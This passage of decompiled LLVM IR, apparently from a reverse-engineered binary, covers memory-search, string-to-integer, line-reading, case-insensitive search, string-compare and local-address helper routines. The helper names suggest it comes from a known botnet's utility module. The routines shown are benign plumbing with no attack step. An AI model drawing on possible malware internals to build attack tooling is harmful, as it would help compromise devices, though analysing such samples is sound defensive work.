dec_label_pc_12344:                               ; preds = %dec_label_pc_12344, %entry
  %v2_12348 = phi i32 [ %v1_1234c, %dec_label_pc_12344 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_12348 = add i32 %v2_12348, %arg1
  %v5_12348 = inttoptr i32 %v4_12348 to i8*
  store i8 0, i8* %v5_12348, align 1
  %v0_1234c = load i32, i32* %r2.global-to-local, align 4
  %v1_1234c = add i32 %v0_1234c, 1
  store i32 %v1_1234c, i32* %r2.global-to-local, align 4
  %v9_12350 = icmp eq i32 %v1_1234c, %arg2
  br i1 %v9_12350, label %dec_label_pc_12358, label %dec_label_pc_12344

dec_label_pc_12358:                               ; preds = %dec_label_pc_12344
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1234c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %v7_12370 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_12370, label %dec_label_pc_12378, label %dec_label_pc_12380

dec_label_pc_12378:                               ; preds = %dec_label_pc_12394, %dec_label_pc_12380, %entry, %dec_label_pc_123c0
  %storemerge = phi i32 [ %v1_123c0, %dec_label_pc_123c0 ], [ -1, %entry ], [ -1, %dec_label_pc_12380 ], [ -1, %dec_label_pc_12394 ]
  ret i32 %storemerge

dec_label_pc_12380:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_12378, label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %dec_label_pc_12380
  br label %dec_label_pc_123a0

dec_label_pc_12394:                               ; preds = %bb, %dec_label_pc_123b4
  %v1_123a03 = phi i32 [ %v1_123b4, %dec_label_pc_123b4 ], [ 0, %bb ]
  %v1_12394 = add i32 %v0_123c0, 1
  %v9_12398 = icmp eq i32 %v1_12394, %arg2
  br i1 %v9_12398, label %dec_label_pc_12378, label %dec_label_pc_123a0

dec_label_pc_123a0:                               ; preds = %dec_label_pc_12394, %dec_label_pc_12388
  %v0_123c0 = phi i32 [ %v1_12394, %dec_label_pc_12394 ], [ 0, %dec_label_pc_12388 ]
  %v1_123a0 = phi i32 [ %v1_123a03, %dec_label_pc_12394 ], [ 0, %dec_label_pc_12388 ]
  %v2_123a0 = add i32 %v1_123a0, %arg3
  %v3_123a0 = inttoptr i32 %v2_123a0 to i8*
  %v4_123a0 = load i8, i8* %v3_123a0, align 1
  %v2_123a4 = add i32 %v0_123c0, %arg1
  %v3_123a4 = inttoptr i32 %v2_123a4 to i8*
  %v4_123a4 = load i8, i8* %v3_123a4, align 1
  %v6_123a4 = zext i8 %v4_123a4 to i32
  store i32 %v6_123a4, i32* @r3, align 4
  %v9_123a8 = icmp eq i8 %v4_123a4, %v4_123a0
  br i1 %v9_123a8, label %dec_label_pc_123b4, label %bb

bb:                                               ; preds = %dec_label_pc_123a0
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12394

dec_label_pc_123b4:                               ; preds = %dec_label_pc_123a0
  %v1_123b4 = add i32 %v1_123a0, 1
  store i32 %v1_123b4, i32* @ip, align 4
  %v9_123b8 = icmp eq i32 %v1_123b4, %arg4
  br i1 %v9_123b8, label %dec_label_pc_123c0, label %dec_label_pc_12394

dec_label_pc_123c0:                               ; preds = %dec_label_pc_123b4
  %v1_123c0 = add i32 %v0_123c0, 1
  br label %dec_label_pc_12378

; uselistorder directives
  uselistorder i32 %v1_123b4, { 1, 2, 0 }
  uselistorder i32 %v1_123a0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12394, { 1, 0 }
  uselistorder label %dec_label_pc_12378, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %.thread, %dec_label_pc_123ec, %bb, %entry
  %v0_123d8 = phi i32 [ %tmp, %entry ], [ %v5_123d8, %bb ], [ %v5_123d8, %dec_label_pc_123ec ], [ %v5_123d8, %.thread ]
  %v1_123d8 = inttoptr i32 %v0_123d8 to i8*
  %v2_123d8 = load i8, i8* %v1_123d8, align 1
  %v5_123d8 = add i32 %v0_123d8, 1
  %v7_123dc = icmp eq i8 %v2_123d8, 9
  br i1 %v7_123dc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_123d8
  br label %dec_label_pc_123d8

bb:                                               ; preds = %dec_label_pc_123d8
  %v8_123e0 = icmp eq i8 %v2_123d8, 32
  br i1 %v8_123e0, label %dec_label_pc_123d8, label %dec_label_pc_123ec

dec_label_pc_123ec:                               ; preds = %bb
  %v7_123ec = icmp eq i8 %v2_123d8, 10
  br i1 %v7_123ec, label %dec_label_pc_123d8, label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123ec
  %v7_123f4 = icmp eq i8 %v2_123d8, 45
  br i1 %v7_123f4, label %dec_label_pc_124e4, label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %dec_label_pc_123f4
  %v7_123fc = icmp eq i8 %v2_123d8, 43
  br i1 %v7_123fc, label %bb54, label %dec_label_pc_1240c

bb54:                                             ; preds = %dec_label_pc_123fc
  %v2_12400 = inttoptr i32 %v5_123d8 to i8*
  %v3_12400 = load i8, i8* %v2_12400, align 1
  %v6_12400 = add i32 %v0_123d8, 2
  br label %dec_label_pc_1240c

dec_label_pc_1240c:                               ; preds = %bb54, %dec_label_pc_123fc, %dec_label_pc_124e4
  %v1_124b439 = phi i32 [ %v5_124e4, %dec_label_pc_124e4 ], [ %v5_123d8, %dec_label_pc_123fc ], [ %v6_12400, %bb54 ]
  %v0_1243410.in = phi i8 [ %v2_124e4, %dec_label_pc_124e4 ], [ %v2_123d8, %dec_label_pc_123fc ], [ %v3_12400, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_124e4 ], [ 2147483647, %dec_label_pc_123fc ], [ 2147483647, %bb54 ]
  %v0_124f4 = phi i32 [ 1, %dec_label_pc_124e4 ], [ 0, %dec_label_pc_123fc ], [ 0, %bb54 ]
  %v2_12414 = udiv i32 %storemerge1, %arg2
  %v3_12414 = urem i32 %storemerge1, %arg2
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12434.outer

dec_label_pc_12434.outer:                         ; preds = %.thread5, %dec_label_pc_1240c
  %v1_124b4.ph = phi i32 [ %v6_124b4, %.thread5 ], [ %v1_124b439, %dec_label_pc_1240c ]
  %v2_124b0.ph = phi i32 [ %v5_124b0, %.thread5 ], [ 0, %dec_label_pc_1240c ]
  %v1_12474.ph.in = phi i8 [ %v3_124b4, %.thread5 ], [ %v0_1243410.in, %dec_label_pc_1240c ]
  %v1_1248c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_1240c ]
  %v3_12480 = icmp uge i32 %v2_124b0.ph, %v2_12414
  %v9_12480 = icmp eq i32 %v2_124b0.ph, %v2_12414
  %v2_12484 = xor i1 %v3_12480, true
  %v3_12484 = or i1 %v9_12480, %v2_12484
  %v2_12488 = xor i1 %v9_12480, true
  %v3_12488 = and i1 %v3_12480, %v2_12488
  %v2_124a8 = icmp eq i1 %v9_12480, false
  br label %dec_label_pc_12434

dec_label_pc_12434:                               ; preds = %dec_label_pc_12434.outer, %dec_label_pc_124bc
  %v1_124b4 = phi i32 [ %v5_124bc, %dec_label_pc_124bc ], [ %v1_124b4.ph, %dec_label_pc_12434.outer ]
  %v1_1248c = phi i32 [ -1, %dec_label_pc_124bc ], [ %v1_1248c.ph, %dec_label_pc_12434.outer ]
  %v1_12474.in = phi i8 [ %v2_124bc, %dec_label_pc_124bc ], [ %v1_12474.ph.in, %dec_label_pc_12434.outer ]
  %v1_12474 = zext i8 %v1_12474.in to i32
  %v1_12434 = urem i32 %v1_12474, 256
  %v1_12438 = add nsw i32 %v1_12434, -48
  %v1_12440 = add nsw i32 %v1_12434, -97
  %v1_12444 = add nsw i32 %v1_12474, -48
  %v1_12448 = add nsw i32 %v1_12434, -65
  %tmp87 = icmp ult i32 %v1_12438, 10
  br i1 %tmp87, label %dec_label_pc_12478, label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %dec_label_pc_12434
  %v2_12450 = icmp ugt i32 %v1_12448, 24
  %v7_12450 = icmp eq i32 %v1_12448, 25
  %v2_12454 = xor i1 %v7_12450, true
  %v3_12454 = and i1 %v2_12450, %v2_12454
  br i1 %v3_12454, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_12450
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_12450, %bb55
  %v0_1246815 = phi i32 [ %v1_12444, %dec_label_pc_12450 ], [ 0, %bb55 ]
  %v2_12458 = xor i1 %v2_12450, true
  %v3_12458 = or i1 %v7_12450, %v2_12458
  br i1 %v3_12458, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_12468 = phi i32 [ %v0_1246815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_12454, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_12460 = icmp ugt i32 %v1_12440, 24
  %v11_12460 = icmp eq i32 %v1_12440, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_12464 = phi i1 [ %v7_12450, %bb58 ], [ %v11_12460, %bb59 ]
  %v0_12464 = phi i1 [ %v2_12450, %bb58 ], [ %v6_12460, %bb59 ]
  %v2_12464 = xor i1 %v1_12464, true
  %v3_12464 = and i1 %v0_12464, %v2_12464
  br i1 %v3_12464, label %dec_label_pc_124c8, label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %bb60
  %v2_12468 = icmp eq i32 %v0_12468, 0
  %. = select i1 %v2_12468, i32 87, i32 55
  %v2_12474 = sub nsw i32 %v1_12474, %.
  br label %dec_label_pc_12478

dec_label_pc_12478:                               ; preds = %dec_label_pc_12434, %dec_label_pc_12468
  %v0_1248c33 = phi i32 [ %v1_12448, %dec_label_pc_12434 ], [ %., %dec_label_pc_12468 ]
  %v3_124b0 = phi i32 [ %v1_12444, %dec_label_pc_12434 ], [ %v2_12474, %dec_label_pc_12468 ]
  %v2_12478 = sub i32 %v3_124b0, %arg2
  %v4_12478 = xor i32 %v3_124b0, %arg2
  %v5_12478 = xor i32 %v2_12478, %v3_124b0
  %v6_12478 = and i32 %v5_12478, %v4_12478
  %v7_12478 = icmp slt i32 %v6_12478, 0
  %v8_12478 = icmp slt i32 %v2_12478, 0
  %v2_1247c = xor i1 %v8_12478, %v7_12478
  br i1 %v2_1247c, label %dec_label_pc_12480, label %dec_label_pc_124c8

dec_label_pc_12480:                               ; preds = %dec_label_pc_12478
  br i1 %v3_12484, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_12480
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_12480, %bb63
  %v0_1248c32 = phi i32 [ %v0_1248c33, %dec_label_pc_12480 ], [ 0, %bb63 ]
  br i1 %v3_12488, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_1248c = phi i32 [ %v0_1248c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_1248c, 0
  %v4_1248c = zext i1 %tmp88 to i32
  %v5_1248c = or i32 %v0_1248c, %v4_1248c
  %v7_1248c = icmp eq i32 %v5_1248c, 0
  br i1 %v7_1248c, label %dec_label_pc_12494, label %dec_label_pc_124bc

dec_label_pc_12494:                               ; preds = %bb66
  %v2_124a0 = sub i32 %v3_124b0, %v3_12414
  %v4_124a0 = xor i32 %v3_124b0, %v3_12414
  %v5_124a0 = xor i32 %v2_124a0, %v3_124b0
  %v6_124a0 = and i32 %v5_124a0, %v4_124a0
  %v7_124a0 = icmp slt i32 %v6_124a0, 0
  %v8_124a0 = icmp slt i32 %v2_124a0, 0
  %v9_124a0 = icmp eq i32 %v3_124b0, %v3_12414
  %v3_124a4 = xor i1 %v8_124a0, %v7_124a0
  %v4_124a4 = or i1 %v9_124a0, %v3_124a4
  br i1 %v4_124a4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12494
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_12494
  store i32 1, i32* @ip, align 4
  br i1 %v2_124a8, label %.thread5, label %dec_label_pc_124bc

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_124b0 = mul i32 %v2_124b0.ph, %arg2
  %v5_124b0 = add i32 %v3_124b0, %v4_124b0
  %v2_124b4 = inttoptr i32 %v1_124b4 to i8*
  %v3_124b4 = load i8, i8* %v2_124b4, align 1
  %v6_124b4 = add i32 %v1_124b4, 1
  br label %dec_label_pc_12434.outer

dec_label_pc_124bc:                               ; preds = %thread-pre-split, %bb66
  %v1_124bc = inttoptr i32 %v1_124b4 to i8*
  %v2_124bc = load i8, i8* %v1_124bc, align 1
  %v5_124bc = add i32 %v1_124b4, 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_12434

dec_label_pc_124c8:                               ; preds = %dec_label_pc_12478, %bb60
  %v1_124c8 = icmp slt i32 %v1_1248c, 0
  %v2_124f4 = icmp eq i32 %v0_124f4, 0
  br i1 %v1_124c8, label %dec_label_pc_124f4, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c8
  br i1 %v2_124f4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_124d0
  %v2_124d4 = sub i32 0, %v2_124b0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_124d0, %bb69
  %v1_124e0 = phi i32 [ -2147483648, %bb71 ], [ %v2_124b0.ph, %dec_label_pc_124d0 ], [ %v2_124d4, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_124e0

dec_label_pc_124e4:                               ; preds = %dec_label_pc_123f4
  %v1_124e4 = inttoptr i32 %v5_123d8 to i8*
  %v2_124e4 = load i8, i8* %v1_124e4, align 1
  %v5_124e4 = add i32 %v0_123d8, 2
  br label %dec_label_pc_1240c

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124c8
  br i1 %v2_124f4, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_124f4
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_124f4
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_124f4, { 1, 0 }
  uselistorder i32 %v2_124a0, { 1, 0 }
  uselistorder i32 %v2_12478, { 1, 0 }
  uselistorder i32 %v3_124b0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_12450, { 1, 2, 0 }
  uselistorder i1 %v2_12450, { 1, 0, 2 }
  uselistorder i32 %v1_12434, { 1, 2, 0 }
  uselistorder i32 %v1_12474, { 1, 0, 2 }
  uselistorder i32 %v1_1248c, { 1, 0 }
  uselistorder i32 %v1_124b4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_12480, { 1, 0, 2 }
  uselistorder i1 %v3_12480, { 1, 0 }
  uselistorder i32 %v2_124b0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_12414, { 1, 0, 2 }
  uselistorder i32 %v2_12414, { 1, 0 }
  uselistorder i32 %v5_123d8, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_123d8, { 0, 1, 3, 2 }
  uselistorder i32 25, { 20, 21, 2, 14, 3, 11, 4, 12, 5, 13, 10, 0, 15, 6, 16, 1, 17, 7, 8, 18, 9, 19, 22 }
  uselistorder i8 32, { 7, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 5, 6, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i8 9, { 4, 0, 3, 1, 2 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_12478, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_12434, { 1, 0 }
  uselistorder label %dec_label_pc_1240c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123d8, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12504 = load i32, i32* @r4, align 4
  store i32 %v3_12504, i32* %stack_var_-24, align 4
  %v6_12504 = load i32, i32* @r5, align 4
  %v9_12504 = load i32, i32* @r6, align 4
  %v12_12504 = load i32, i32* @r7, align 4
  %v15_12504 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12540.dec_label_pc_1251c_crit_edge, %entry
  %v0_12520 = phi i32 [ %v0_12520.pre, %dec_label_pc_12540.dec_label_pc_1251c_crit_edge ], [ %arg3, %entry ]
  %v0_1251c = phi i32 [ %v5_12540, %dec_label_pc_12540.dec_label_pc_1251c_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_1251c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_12528 = call i32 @__libc_read(i32 %v0_12520)
  %v7_1252c = icmp eq i32 %v1_12528, 1
  %v0_12534 = load i32, i32* @r5, align 4
  br i1 %v7_1252c, label %dec_label_pc_12534, label %dec_label_pc_1254c

dec_label_pc_12534:                               ; preds = %dec_label_pc_1251c
  %v1_12534 = add i32 %v0_12534, 1
  store i32 %v1_12534, i32* @r5, align 4
  %v1_12538 = load i32, i32* @r8, align 4
  %v6_1253c = icmp slt i32 %v1_12534, %v1_12538
  br i1 %v6_1253c, label %dec_label_pc_12540, label %.loopexit

dec_label_pc_12540:                               ; preds = %dec_label_pc_12534
  %v0_12540 = load i32, i32* @r4, align 4
  %v1_12540 = inttoptr i32 %v0_12540 to i8*
  %v2_12540 = load i8, i8* %v1_12540, align 1
  %v3_12540 = zext i8 %v2_12540 to i32
  store i32 %v3_12540, i32* @r3, align 4
  %v5_12540 = add i32 %v0_12540, 1
  store i32 %v5_12540, i32* @r4, align 4
  %v7_12544 = icmp eq i8 %v2_12540, 10
  br i1 %v7_12544, label %dec_label_pc_1254c, label %dec_label_pc_12540.dec_label_pc_1251c_crit_edge

dec_label_pc_12540.dec_label_pc_1251c_crit_edge:  ; preds = %dec_label_pc_12540
  %v0_12520.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1251c

dec_label_pc_1254c:                               ; preds = %dec_label_pc_1251c, %dec_label_pc_12540
  %v0_1254c = phi i32 [ %v1_12534, %dec_label_pc_12540 ], [ %v0_12534, %dec_label_pc_1251c ]
  %v2_1254c = icmp eq i32 %v0_1254c, 0
  br i1 %v2_1254c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_1254c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_12534, %dec_label_pc_1254c, %bb
  %v0_12554 = load i32, i32* @r7, align 4
  %v2_12558 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12558, i32* @r4, align 4
  store i32 %v6_12504, i32* @r5, align 4
  store i32 %v9_12504, i32* @r6, align 4
  store i32 %v12_12504, i32* @r7, align 4
  store i32 %v15_12504, i32* @r8, align 4
  ret i32 %v0_12554

; uselistorder directives
  uselistorder i32 %v5_12540, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1254c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12560 = load i32, i32* @r4, align 4
  %v6_12560 = load i32, i32* @r5, align 4
  %v9_12560 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_12570 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_12578 = inttoptr i32 %v0_12570 to i32*
  store i32 0, i32* %v2_12578, align 4
  %v0_12584 = load i32, i32* %r4.global-to-local, align 4
  %v3_12588 = call i32 @socket(i32 2, i32 2, i32 %v0_12584)
  %v7_1258c = icmp eq i32 %v3_12588, -1
  store i32 %v3_12588, i32* @r5, align 4
  br i1 %v7_1258c, label %bb, label %dec_label_pc_1259c

bb:                                               ; preds = %entry
  %v1_12594 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_1259c:                               ; preds = %entry
  %v2_125a8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_125a8, i32* @r4, align 4
  %v0_125b4 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_125c8 = call i32 @__libc_connect(i32 %v3_12588, i32 %v2_125a8, i32 %v0_125b4)
  %v2_125d0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_125d4 = load i32, i32* @r5, align 4
  %v3_125d8 = call i32 @__GI_getsockname(i32 %v0_125d4, i32 %v2_125a8, i32 %v2_125d0)
  %v0_125dc = load i32, i32* @r5, align 4
  %v1_125e0 = call i32 @__GI___libc_close(i32 %v0_125dc)
  br label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %bb, %dec_label_pc_1259c
  %storemerge = phi i32 [ 134744072, %dec_label_pc_1259c ], [ %v1_12594, %bb ]
  store i32 %v3_12560, i32* @r4, align 4
  store i32 %v6_12560, i32* @r5, align 4
  store i32 %v9_12560, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_12588, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 3, 1, 2, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 4, 1, 2, 3, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 3, 6, 5, 0, 2, 1 }
  uselistorder label %dec_label_pc_125e8, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_125f8 = load i8, i8* %tmp, align 1
  %v4_125f8 = zext i8 %v3_125f8 to i32
  store i32 %v4_125f8, i32* @r3, align 4
  %v2_125fc = icmp eq i8 %v3_125f8, 0
  br i1 %v2_125fc, label %bb, label %dec_label_pc_12610

bb:                                               ; preds = %entry
  br label %dec_label_pc_12624

dec_label_pc_12610:                               ; preds = %entry
  br label %dec_label_pc_12614

dec_label_pc_12614:                               ; preds = %dec_label_pc_12614, %dec_label_pc_12610
  %v0_12614 = phi i32 [ %v1_12614, %dec_label_pc_12614 ], [ 0, %dec_label_pc_12610 ]
  %v1_12614 = add i32 %v0_12614, 1
  %v2_12618 = add i32 %v1_12614, %arg2
  %v3_12618 = inttoptr i32 %v2_12618 to i8*
  %v4_12618 = load i8, i8* %v3_12618, align 1
  %v6_12618 = zext i8 %v4_12618 to i32
  store i32 %v6_12618, i32* @r3, align 4
  %v2_1261c = icmp eq i8 %v4_12618, 0
  br i1 %v2_1261c, label %dec_label_pc_12624, label %dec_label_pc_12614

dec_label_pc_12624:                               ; preds = %dec_label_pc_12614, %bb
  %v0_1266821 = phi i32 [ %v4_125f8, %bb ], [ %v1_12614, %dec_label_pc_12614 ]
  %v0_1262c2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_1262c2, 1
  br i1 %tmp29, label %dec_label_pc_1267c, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %dec_label_pc_12624, %dec_label_pc_1262c.backedge
  %v0_12630.in = phi i32 [ %v0_12630, %dec_label_pc_1262c.backedge ], [ %v0_1262c2, %dec_label_pc_12624 ]
  %v1_12644 = phi i32 [ %v1_1264415, %dec_label_pc_1262c.backedge ], [ 0, %dec_label_pc_12624 ]
  %v0_12638 = phi i32 [ %v5_12638, %dec_label_pc_1262c.backedge ], [ %tmp23, %dec_label_pc_12624 ]
  %v0_12630 = add i32 %v0_12630.in, -1
  %v1_12638 = inttoptr i32 %v0_12638 to i8*
  %v2_12638 = load i8, i8* %v1_12638, align 1
  %v3_12638 = zext i8 %v2_12638 to i32
  store i32 %v3_12638, i32* @ip, align 4
  %v5_12638 = add i32 %v0_12638, 1
  %v1_1263c = add nsw i32 %v3_12638, -65
  %v2_12644 = add i32 %v1_12644, %arg2
  %v3_12644 = inttoptr i32 %v2_12644 to i8*
  %v4_12644 = load i8, i8* %v3_12644, align 1
  %v6_12644 = zext i8 %v4_12644 to i32
  store i32 %v6_12644, i32* @r3, align 4
  %v1_12648 = add nsw i32 %v6_12644, -65
  %tmp38 = icmp ult i32 %v1_1263c, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_12638
  %v5_1264c = or i32 %v3_12638, 96
  store i32 %v5_1264c, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_12638, %bb30
  %v0_12658 = phi i32 [ %v3_12638, %dec_label_pc_12638 ], [ %v5_1264c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_12648, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_12654 = or i32 %v6_12644, 96
  store i32 %v5_12654, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_12658 = phi i32 [ %v6_12644, %bb31 ], [ %v5_12654, %bb32 ]
  %v9_12658 = icmp eq i32 %v0_12658, %v1_12658
  br i1 %v9_12658, label %dec_label_pc_12664, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_1262c.backedge

dec_label_pc_1262c.backedge:                      ; preds = %bb34, %dec_label_pc_12664
  %v1_1264415 = phi i32 [ 0, %bb34 ], [ %v1_12664, %dec_label_pc_12664 ]
  %tmp35 = icmp slt i32 %v0_12630, 1
  br i1 %tmp35, label %dec_label_pc_1267c, label %dec_label_pc_12638

dec_label_pc_12664:                               ; preds = %bb33
  %v1_12664 = add i32 %v1_12644, 1
  %v9_12668 = icmp eq i32 %v0_1266821, %v1_12664
  br i1 %v9_12668, label %dec_label_pc_12670, label %dec_label_pc_1262c.backedge

dec_label_pc_12670:                               ; preds = %dec_label_pc_12664
  %v2_12670 = sub i32 %v5_12638, %tmp23
  br label %dec_label_pc_1267c

dec_label_pc_1267c:                               ; preds = %dec_label_pc_1262c.backedge, %dec_label_pc_12624, %dec_label_pc_12670
  %storemerge = phi i32 [ %v2_12670, %dec_label_pc_12670 ], [ -1, %dec_label_pc_12624 ], [ -1, %dec_label_pc_1262c.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12664, { 1, 0 }
  uselistorder i32 %v0_12638, { 1, 0 }
  uselistorder i32 %v1_12644, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_1267c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1262c.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_12638, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12684 = load i8, i8* %arg1, align 1
  %v2_12688 = icmp eq i8 %v2_12684, 0
  br i1 %v2_12688, label %bb, label %dec_label_pc_12694

bb:                                               ; preds = %entry
  %v3_12684 = zext i8 %v2_12684 to i32
  br label %dec_label_pc_126a8

dec_label_pc_12694:                               ; preds = %entry
  br label %dec_label_pc_12698

dec_label_pc_12698:                               ; preds = %dec_label_pc_12698, %dec_label_pc_12694
  %v0_12698 = phi i32 [ %v1_12698, %dec_label_pc_12698 ], [ 0, %dec_label_pc_12694 ]
  %v1_12698 = add i32 %v0_12698, 1
  %v2_1269c = add i32 %v1_12698, %tmp
  %v3_1269c = inttoptr i32 %v2_1269c to i8*
  %v4_1269c = load i8, i8* %v3_1269c, align 1
  %v2_126a0 = icmp eq i8 %v4_1269c, 0
  br i1 %v2_126a0, label %dec_label_pc_126a8, label %dec_label_pc_12698

dec_label_pc_126a8:                               ; preds = %dec_label_pc_12698, %bb
  %v0_126f43 = phi i32 [ %v3_12684, %bb ], [ %v1_12698, %dec_label_pc_12698 ]
  %v1_126a8 = inttoptr i32 %arg2 to i8*
  %v2_126a8 = load i8, i8* %v1_126a8, align 1
  %v3_126a8 = zext i8 %v2_126a8 to i32
  store i32 %v3_126a8, i32* @r3, align 4
  %v2_126ac = icmp eq i8 %v2_126a8, 0
  br i1 %v2_126ac, label %bb21, label %dec_label_pc_126b8

bb21:                                             ; preds = %dec_label_pc_126a8
  store i32 %v3_126a8, i32* @r2, align 4
  br label %dec_label_pc_126cc

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126a8
